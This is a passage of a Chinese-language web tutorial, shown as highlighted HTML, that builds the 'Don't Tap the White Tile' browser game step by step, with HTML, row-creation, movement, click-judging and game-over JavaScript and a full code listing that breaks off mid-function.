class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果以上部分你都能够理解并且对应着代码实现的话，那么我们看到的应该是一个空格子，我们设置 id 为 con 的 div 的 top 属性为 0 px: <code>#con {top: 0px;}</code>，这样我们就可以看见：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59750/uid1133717-20191017-1571294959274.gif" alt="图片描述"></p><p>是不是很像别踩白块的界面了呢，我们已经成功了一大步，然后就是通过 js 来实现动态的插入黑块或白块，以及操作。</p><h4 id="游戏初始化"><a href="#游戏初始化" class="headerlink" title="游戏初始化"></a>游戏初始化</h4><p>根据前面的 HTML 部分我们可以知道，每个 <code>&lt;div class="cell"&gt;</code> 就代表一个白块，<code>&lt;div class="cell black"&gt;</code> 就代表一个黑块，每点击一个黑块消失其实是删除了一个 <code>&lt;div class="row"&gt;</code> 然后从上面添加一个新的 <code>&lt;div class="row"&gt;</code> 所以我们首先要通过 js 来控制 <code>&lt;div class="row"&gt;</code> 的创造和生成（记得删除在编写静态页面时候指定生成的 4 个 <code>div.row</code>）。具体方法如下：</p><p>删除之前写的 4 个 div.row，将 index.html 文件改为以下代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>别踩白块<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/index.css"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>score<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">"score"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"con"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"start"</span> <span class="attr">onclick</span>=<span class="string">"start()"</span>&gt;</span></span><br><span class="line">        开始游戏</span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>对游戏进行初始化，在 <code>js/index.js</code> 文件中写入以下代码：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建div, className是其类名</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">className</span>) {</span><br><span class="line">  <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">'div'</span>);</span><br><span class="line">  div.<span class="property">className</span> = className;</span><br><span class="line">  <span class="keyword">return</span> div;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创造一个&lt;div class="row"&gt;并且有四个子节点&lt;div class="cell"&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">var</span> row = <span class="title function_">creatediv</span>(<span class="string">'row'</span>); <span class="comment">//创建div className=row</span></span><br><span class="line">  <span class="keyword">var</span> arr = <span class="title function_">creatcell</span>(); <span class="comment">//定义div cell的类名,其中一个为cell black</span></span><br><span class="line"></span><br><span class="line">  con.<span class="title function_">appendChild</span>(row); <span class="comment">// 添加row为con的子节点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) {</span><br><span class="line">    row.<span class="title function_">appendChild</span>(<span class="title function_">creatediv</span>(arr[i])); <span class="comment">//添加row的子节点 cell</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (con.<span class="property">firstChild</span> == <span class="literal">null</span>) {</span><br><span class="line">    con.<span class="title function_">appendChild</span>(row);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    con.<span class="title function_">insertBefore</span>(row, con.<span class="property">firstChild</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除div#con的子节点中最后那个&lt;div class="row"&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">if</span> (con.<span class="property">childNodes</span>.<span class="property">length</span> == <span class="number">6</span>) {</span><br><span class="line">    con.<span class="title function_">removeChild</span>(con.<span class="property">lastChild</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个类名的数组，其中一个为cell black, 其余为cell</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatcell</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> temp = [<span class="string">'cell'</span>, <span class="string">'cell'</span>, <span class="string">'cell'</span>, <span class="string">'cell'</span>];</span><br><span class="line">  <span class="keyword">var</span> i = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">4</span>); <span class="comment">//随机产生黑块的位置 Math.random()函数参数 0~1的随机数</span></span><br><span class="line">  temp[i] = <span class="string">'cell black'</span>;</span><br><span class="line">  <span class="keyword">return</span> temp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="让黑块动起来"><a href="#让黑块动起来" class="headerlink" title="让黑块动起来"></a>让黑块动起来</h4><p>在可以通过 js 来创造和销毁 <code>div</code> 后，我们就要让黑块动起来，这个时候我们就用到了之前 css 提到的设定 <code>&lt;div id="con"&gt;</code> 隐藏了一行的 <code>&lt;div id="row"&gt;</code>，我们通过 js 的 DOM 操作使其向下方移动，并设置定时器每 30 毫秒移动一次，这样就实现了黑块的平滑移动，在黑块移动的同时，我们要判断黑块是否已经触底，触底则游戏失败，停止调用 <code>move()</code>，触底后调用函数 <code>fail()</code> 游戏失败，具体方法如下：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//让黑块动起来</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">var</span> top = <span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(con, <span class="literal">null</span>)[<span class="string">'top'</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (speed + top &gt; <span class="number">0</span>) {</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    top += speed;</span><br><span class="line">  }</span><br><span class="line">  con.<span class="property">style</span>.<span class="property">top</span> = top + <span class="string">'px'</span>; <span class="comment">//不断移动top值，使它动起来</span></span><br><span class="line">  <span class="title function_">over</span>();</span><br><span class="line">  <span class="keyword">if</span> (top == <span class="number">0</span>) {</span><br><span class="line">    <span class="title function_">createrow</span>();</span><br><span class="line">    con.<span class="property">style</span>.<span class="property">top</span> = <span class="string">'-102px'</span>;</span><br><span class="line">    <span class="title function_">delrow</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加速函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>) {</span><br><span class="line">  speed += <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (speed == <span class="number">20</span>) {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">'你超神了'</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断游戏是否结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> rows = con.<span class="property">childNodes</span>;</span><br><span class="line">  <span class="keyword">if</span> (rows.<span class="property">length</span> == <span class="number">5</span> &amp;&amp; rows[rows.<span class="property">length</span> - <span class="number">1</span>].<span class="property">pass</span> !== <span class="number">1</span>) {</span><br><span class="line">    <span class="title function_">fail</span>();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rows.<span class="property">length</span>; i++) {</span><br><span class="line">    <span class="keyword">if</span> (rows[i].<span class="property">pass1</span> == <span class="number">1</span>) {</span><br><span class="line">      <span class="title function_">fail</span>();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 游戏结束</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="built_in">clearInterval</span>(clock);</span><br><span class="line">  flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="title function_">confirm</span>(<span class="string">'你的最终得分为 '</span> + <span class="built_in">parseInt</span>($(<span class="string">'score'</span>).<span class="property">innerHTML</span>));</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  con.<span class="property">innerHTML</span> = <span class="string">''</span>;</span><br><span class="line">  $(<span class="string">'score'</span>).<span class="property">innerHTML</span> = <span class="number">0</span>;</span><br><span class="line">  con.<span class="property">style</span>.<span class="property">top</span> = <span class="string">'-408px'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="点击黑块事件"><a href="#点击黑块事件" class="headerlink" title="点击黑块事件"></a>点击黑块事件</h4><p>让黑块动起来之后呢，我们就来考虑怎么判断用户有没有点击到黑块呢，同时用户若点击到黑块，我们要让所在那一行消失，那么我们需要一个 <code>judge</code> 方法，具体如下：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断是否点击黑块、白块</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">ev</span>) {</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'black'</span>) == -<span class="number">1</span> &amp;&amp;</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'cell'</span>) !== -<span class="number">1</span></span><br><span class="line">  ) {</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass1</span> = <span class="number">1</span>; <span class="comment">//定义属性pass，表示此行row的白块已经被点击</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'black'</span>) !== -<span class="number">1</span>) {</span><br><span class="line">    <span class="comment">//点击目标元素 类名中包含 black 说明是黑块</span></span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span> = <span class="string">'cell'</span>;</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass</span> = <span class="number">1</span>; <span class="comment">//定义属性pass，表明此行row的黑块已经被点击</span></span><br><span class="line">    <span class="title function_">score</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其实程序写到这里，几个核心的功能点都已经实现了，是不是感觉很简单呢。剩下来的就是将这些方法组合起来，组成完整的逻辑关系，在我给出的源码里添加有一个记分器记录用户分数的功能，同时设置加速方法，使黑块的移动越来越快等等。有兴趣的的同学可以尝试着添加事件按钮，使这个游戏更接近 APP 版本。</p><h4 id="js-完整代码"><a href="#js-完整代码" class="headerlink" title="js 完整代码"></a>js 完整代码</h4><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 工具封装</span></span><br><span class="line"><span class="comment">// 根据id来获取元素</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">id</span>) {</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(id);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建div, className是其类名</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">className</span>) {</span><br><span class="line">  <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">'div'</span>);</span><br><span class="line">  div.<span class="property">className</span> = className;</span><br><span class="line">  <span class="keyword">return</span> div;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">var</span> clock = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> state = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> speed = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//点击开始游戏按钮 开始游戏</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">if</span> (!flag) {</span><br><span class="line">    <span class="title function_">init</span>();</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">'游戏已经开始，无须再次点击！'</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *    初始化 init</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) {</span><br><span class="line">  flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) {</span><br><span class="line">    <span class="title function_">createrow</span>();</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加onclick事件</span></span><br><span class="line">  $(<span class="string">'main'</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params">ev</span>) {</span><br><span class="line">    ev = ev || event;</span><br><span class="line">    <span class="title function_">judge</span>(ev);</span><br><span class="line">  };</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定时器 每30毫秒调用一次move()</span></span><br><span class="line">  clock = <span class="variable language_">window</span>.<span class="built_in">setInterval</span>(<span class="string">'move()'</span>, <span class="number">30</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否点击黑块、白块</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">ev</span>) {</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'black'</span>) == -<span class="number">1</span> &amp;&amp;</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'cell'</span>) !== -<span class="number">1</span></span><br><span class="line">  ) {</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass1</span> = <span class="number">1</span>; <span class="comment">//定义属性pass，表示此行row的白块已经被点击</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'black'</span>) !== -<span class="number">1</span>) {</span><br><span class="line">    <span class="comment">//点击目标元素 类名中包含 black 说明是黑块</span></span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span> = <span class="string">'cell'</span>;</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass</span> = <span class="number">1</span>; <span class="comment">//定义属性pass，表明此行row的黑块已经被点击</span></span><br><span class="line">    <span class="title function_">score</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断游戏是否结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> rows = con.<span class="property">childNodes</span>;</span><br><span class="line">  <span class="keyword">if</span> (rows.<span class="property">length</span> == <span class="number">5</span> &amp;&amp; rows[rows.<span class="property">length</span> - <span class="number">1</span>].<span class="property">pass</span> !== <span class="number">1</span>) {</span><br><span class="line">    <span class="title function_">fail</span>();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rows.<span class="property">length</span>; i++) {</span><br><span class="line">    <span class="keyword">if</span> (rows[i].<span class="property">pass1</span> == <span class="number">1</span>) {</span><br><span class="line">      <span class="title function_">fail</span>();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 游戏结束</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="built_in">clearInterval</span>(clock);</span><br><span class="line">  flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="title function_">confirm</span>(<span class="string">'你的最终得分为 '</span> + <span class="built_in">parseInt</span>($(<span class="string">'score'</span>).<span class="property">innerHTML</span>));</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  con.<span class="property">innerHTML</span> = <span class="string">''</span>;</span><br><span class="line">  $(<span class="string">'score'</span>).<span class="property">innerHTML</span> = <span class="number">0</span>;</span><br><span class="line">  con.<span class="property">style</span>.<span class="property">top</span> = <span class="string">'-408px'</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创造一个&lt;div class="row"&gt;并且有四个子节点&lt;div class="cell"&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">var</span> row = <span class="title function_">creatediv</span>(<span class="string">'row'</span>); <span class="comment">//创建div className=row</span></span><br><span class="line">  <span class="keyword">var</span> arr = <span class="title function_">creatcell</span>(); <span class="comment">//定义div cell的类名,其中一个为cell black</span></span><br><span class="line"></span><br><span class="line">  con.<span class="title function_">appendChild</span>(row); <span class="comment">// 添加row为con的子节点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) {</span><br><span class="line">    row.<span class="title function_">appendChild</span>(<span class="title function_">creatediv</span>(arr[i])); <span class="comment">//添加row的子节点 cell</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (con.<span class="property">firstChild</span> == <span class="literal">null</span>) {</span><br><span class="line">    con.<span class="title function_">appendChild</span>(row);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    con.<span class="title function_">insertBefore</span>(row, con.<span class="property">firstChild</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个类名的数组，其中一个为cell black, 其余为cell</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatcell</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> temp = [<span class="string">'cell'</span>, <span class="string">'cell'</span>, <span class="string">'cell'</span>, <span class="string">'cell'</span>];</span><br><span class="line">  <span class="keyword">var</span> i = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">4</span>); <span class="comment">//随机产生黑块的位置 Math.random()函数参数 0~1的随机数</span></span><br><span class="line">  temp[i] = <span class="string">'cell black'</span>;</span><br><span class="line">  <span class="keyword">return</span> temp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//让黑块动起来</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">var</span> top = <span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(con, <span class="literal">null</span>)[<span class="string">'top'</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (speed + top &gt; <span class="number">0</span>) {</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    top += speed;</span><br><span class="line">  }</span><br><span class="line">  con.<span class="property">style</span>.<span class="property">top</span> = top + <span class="string">'px'</span>; <span class="comment">//不断移动top值，使它动起来</span></span><br><span class="line">  <span class="title function_">over</span>();</span><br><span class="line">  <span class="keyword">if</span> (top == <span class="number">0</span>) {</span><br><span class="line">    <span class="title function_">createrow</span>();</span><br><span class="line">    con.<span class="property">style</span>.<span class="property">top</span> = <span class="string">'-102px'</span>;</span><br><span class="line">    <span class="title function_">delrow</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加速函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>) {</span><br><span class="line">  speed += <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (speed == <span class="number">20</span>) {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">'你超神了'</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除某行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delrow</span>(<span 